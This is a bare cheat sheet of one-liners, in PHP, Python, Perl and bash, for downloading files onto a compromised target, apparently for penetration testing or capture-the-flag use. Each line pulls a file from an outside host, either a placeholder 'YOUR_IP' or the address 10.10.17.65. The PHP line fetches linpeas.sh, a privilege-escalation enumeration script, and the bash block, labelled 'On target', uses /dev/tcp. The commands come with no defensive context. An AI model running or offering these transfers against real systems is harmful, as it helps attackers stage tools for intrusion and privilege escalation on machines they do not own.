```php
php -r "file_put_contents('linpeas.sh', file_get_contents('http://10.10.17.65/linpeas.sh'));"
```

```python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://YOUR_IP:8000/file.txt', 'file.txt')"
```

```perl
perl -e "use LWP::Simple; getstore('http://YOUR_IP:8000/file.txt', 'file.txt');"
```

```bash


# On target, download using bash:
exec 3<>/dev/tcp/YOUR_IP/8000
echo -e "GET /file.txt HTTP/1.1\r\nHost: YOUR_IP\r\nConnection: close\r\n\r\n" >&3
cat <&3 > file.txt


```